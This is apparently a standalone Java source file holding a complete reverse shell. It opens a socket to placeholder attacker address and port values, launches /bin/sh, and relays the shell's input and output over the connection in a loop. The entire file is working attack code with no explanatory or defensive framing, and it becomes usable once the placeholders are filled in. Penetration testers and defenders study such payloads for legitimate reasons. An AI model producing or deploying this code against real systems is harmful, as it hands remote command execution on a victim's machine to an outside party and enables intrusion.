import java.io.*;
import java.net.Socket;

public class reverse {
    public static void main(String [] args){
        try {
            Socket socket = new Socket(<ATTACKER_IP>, <ATTACKER_PORT>);

            InputStream socket_input = socket.getInputStream();
            OutputStream socket_output = socket.getOutputStream();

            Process shell = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();

            InputStream shell_input = shell.getInputStream();
            OutputStream shell_output = shell.getOutputStream();

            while(!socket.isClosed()){
                while(shell_input.available()>0) {
                    socket_output.write(shell_input.read());
                }
                while(socket_input.available()>0) {
                    shell_output.write(socket_input.read());
                }

                shell_output.flush();
                socket_output.flush();
                Thread.sleep(50);
            }

            shell.destroy();
            socket.close();

        }
        catch(Exception ex){
            ex.printStackTrace();
            System.exit(1);
        }
    }
}




